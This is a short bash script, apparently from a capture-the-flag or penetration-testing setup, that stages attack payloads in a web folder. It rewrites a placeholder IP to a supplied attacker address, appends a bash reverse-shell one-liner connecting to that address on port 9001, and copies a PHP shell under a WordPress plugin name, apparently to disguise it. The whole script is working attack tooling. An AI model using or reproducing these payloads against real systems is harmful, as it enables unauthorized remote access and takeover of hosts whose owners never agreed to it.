#!/bin/bash
cp -r www-skel www
sed -i "s/10.10.14.2/$1/g" www/*
echo "bash -c 'bash -i >& /dev/tcp/$1/9001 0>&1'" >> www/shell.sh
cp www/shell.php www/wp-plugin.php
